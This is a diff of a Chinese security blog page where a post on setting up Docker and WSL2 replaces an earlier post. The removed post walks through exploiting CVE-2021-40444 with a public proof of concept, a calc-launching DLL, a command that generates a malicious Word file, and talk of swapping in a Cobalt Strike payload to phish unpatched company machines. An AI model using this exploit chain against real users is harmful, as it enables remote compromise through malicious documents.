@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CVE-2021-40444 | HackLog</title>
-  <meta name="keywords" content=" 漏洞 ">
-  <meta name="description" content="CVE-2021-40444 | HackLog">
+  <title>记一次Docker试水 | HackLog</title>
+  <meta name="keywords" content=" 环境 ">
+  <meta name="description" content="记一次Docker试水 | HackLog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="关于">
@@ -301,9 +301,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-5.microsoftvuln" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-6-docker" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">CVE-2021-40444</h1>
+        <h1 class="article-title">记一次Docker试水</h1>
     
     <div class="article-meta">
         
@@ -313,19 +313,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color3">漏洞</a>
+            <a class="color3">环境</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-09-21 20:36:16'>2021-09-21 18:27</time>
+            发布时间 : <time class="date" title='最后更新: 2021-09-25 22:09:23'>2021-09-25 21:06</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:665</span>
+        <span>字数:696</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -344,7 +344,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞利用原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">漏洞利用过程</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-text">过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -360,70 +360,39 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1718/">https://paper.seebug.org/1718/</a></li>
-</ul>
-<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><p>前一阵子的微软0day大洞，CVE-2021-40444，之前因为些杂七杂八的事情，错过了好时机，现在来补上。头一次研究这个方向的漏洞，过去都是渗透方面的漏洞，这个应该是属于红队方面的了，而且偏软件类，由于这方面知识储备不足，深层的漏洞原理也只是模糊了解，但不管怎么说，这个漏洞就当作初入这个领域的热身了。</p>
-<p>Microsoft MSHTML的远程代码执行导致可以利用ActiveX进行控制</p>
-<p>以word为例，在word内插入一个由文件创建的对象，选择链接到文件，文件名选择准备好的恶意文件的外部地址，就像挂马一样</p>
-<p>漏洞利用mhtml协议打开远程站点的html文件，而其中包含的JS代码创建ActiveX来下载提前构筑好的cab文件，提取其中的inf文件（DLL）并以CPL执行，最终执行其中的payload。</p>
-<p>软件调试方面的资料有上面的参考。</p>
-<h2 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h2><p>选择用github上的poc</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></li>
-</ul>
-<pre><code class="shell">sudo apt-get install lcab
-sudo apt-get install mingw-w64
+        <h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>容器是非常强大的一项发明，他解决了过去许多环境配置非常冗杂的问题。</p>
+<p>很久之前就已经听说docker了，但是一直没去用过，今天想把这个坑给填上，于是乎就开始实验了。</p>
+<p>首先直接是装一个docker-desktop，由于不想开虚拟机再配置虚拟环境，这样对电脑的性能会有影响，所以是在windows上面配置。打开docker之后上来的问题就是说报错wsl 2未配置。</p>
+<p><img src="/posts/12341lkaf/2.png"></p>
+<p>这下就有来头了，这wsl2装好之后，发现这是个非常强大功能，直接在windows上运行了linux环境。</p>
+<p><img src="/posts/12341lkaf/1.png"></p>
+<p>但由于默认是在C盘下，C盘有限的空间不能装太多东西，于是就将其导出，然后换个盘重新导入</p>
+<pre><code class="sh">wsl --list -v    #查看当前环境的列表
+wsl --export xxx x:/xxx.tar    #导出
+wsl --unregister xxx    #将原来的卸载
+wsl --import xxx x:/xxx x:/xxx.tar --version 2 #导入
+xxx config --default-user xxx #重新配置一下原来的默认账户，否则默认是root
 </code></pre>
-<p>安装好lcab和编译环境</p>
-<p>制作我们自己想要的dll文件，创建.c文件将想要的payload放进去，比如想要CS上线就把就用CS的payload，我们直接用官方自带的弹计算器的payload。</p>
-<pre><code class="c">#include &lt;windows.h&gt;
-
-void exec(void) &#123;
-    system(&quot;C:\\Windows\\System32\\calc.exe&quot;);
-    return;
-&#125;
-
-BOOL WINAPI DllMain(
-    HINSTANCE hinstDLL,
-    DWORD fdwReason, 
-    LPVOID lpReserved )
-&#123;
-    switch( fdwReason ) 
-    &#123; 
-        case DLL_PROCESS_ATTACH:
-           exec(); 
-           break;
-
-        case DLL_THREAD_ATTACH:
-            break;
-
-        case DLL_THREAD_DETACH:
-            break;
-
-        case DLL_PROCESS_DETACH:
-            break;
-    &#125;
-    return TRUE;
-&#125;
-</code></pre>
-<p><img src="/posts/lsqwreoxckl/1.png"></p>
-<p>然后把他编译为dll文件，并放入test目录</p>
-<pre><code class="shell">i686-w64-mingw32-gcc -shared x.c -o x.dll
-</code></pre>
-<p><img src="/posts/lsqwreoxckl/2.png"></p>
-<p>接下来就运行exploit文件来生成携有恶意JS的html以及cab文件</p>
-<pre><code class="shell">python3 exploit.py generate test/x.dll http://xx.xx.xx.xx #存payload的dll与公网服务器地址
-</code></pre>
-<p>进入/src开启web服务</p>
-<pre><code class="shell">python3 -m http.server 80
-</code></pre>
-<p><img src="/posts/lsqwreoxckl/3.png"></p>
-<p>再把out目录下生成的或者我们自己添加对象了的恶意word文件在windows打开就可以顺利弹一个计算器出来。如果payload放的是cs的powershell那就直接上线了，对方只要打开word就直接被拿下。</p>
-<p>目前微软已经更新了补丁，但是这招依然可以对不少目标实施攻击，尤其是一些公司内计算机系统，大部分都是老的而且不怎么更新的，进行钓鱼攻击的话直接上线CS再进行内网渗透，扩大战果。</p>
+<p>然后启动docker发现还是报错，这时候应该是我们wsl版本低了，去安装个升级版本就行了。</p>
 <hr>
-<center>顺带节日祝福，中秋快乐 </center>
-
+<p>搞好后就可以开始搞docker了</p>
+<p>以一个古老的kms镜像举例</p>
+<p>拿到一个dockerfile</p>
+<pre><code class="sh">docker build -t kms:v1 .    #先build一个镜像
+dokcer run -i -p 1688:1688 kms:v1    #启动kms:v1的container，容器端口映射到了本机的1688
+</code></pre>
+<p><img src="/posts/12341lkaf/3.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这样一来container就起来了，docker-desktop还带有图像化界面可以操作，像vulhub这种有compose的，配置文件是yml，可以利用docker-compose up/down 来执行。</p>
+<p>这次经验直接解决了windows下渗透机的问题，比如searchsploit或者其他工具，这样一来，渗透效率会提高许多，试想一下，把vulhub，宝塔，phpstudy，docker各种环境揉起来，甚至可以直接一套机子整套环境，再加上个rolan，不知道效率会不会起飞呢。不过最好还是分几个虚拟机比较好，safety first。</p>
+<hr>
+<blockquote>
+<ul>
+<li><p>最近在学习些操作系统机制，从舟长那里学到了不少，那些病毒也很有魅力，打算以后往红队发展了，算是转正吧。发现踏实研究的要比现在网上那些华而不实的人好太多，奇技淫巧拿来吹牛b或者自娱自乐还不错，但终究还是虚的，今后像TOM这样的可能只会越来越多，趋势如此。</p>
+</li>
+<li><p>今天看企鹅发了篇信息收集的专栏，觉得挺不错，打算再做一此信息收集的概要，并不会完全覆盖到，毕竟这一面太广，先把企鹅的那些给做掉。</p>
+</li>
+</ul>
+</blockquote>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -433,12 +402,12 @@ BOOL WINAPI DllMain(
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>CVE-2021-40444</p>
-    <p><span class="copy-title">字数:</span><span class="post-count">665</span></p>
+    <p><span class="copy-title">文章标题:</span>记一次Docker试水</p>
+    <p><span class="copy-title">字数:</span><span class="post-count">696</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="Z3rg">Z3rg</a></p>
-    <p><span class="copy-title">发布时间:</span>2021-09-21, 18:27:45</p>
-    <p><span class="copy-title">最后更新:</span>2021-09-21, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/lsqwreoxckl/" title="CVE-2021-40444">https://swertluck.vip/posts/lsqwreoxckl/</a>
+    <p><span class="copy-title">发布时间:</span>2021-09-25, 21:06:39</p>
+    <p><span class="copy-title">最后更新:</span>2021-09-25, 22:09:23</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/12341lkaf/" title="记一次Docker试水">https://swertluck.vip/posts/12341lkaf/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#34;署名-非商用-相同方式共享 4.0&#34;</a> 转载请保留原文链接及作者。
     </p>
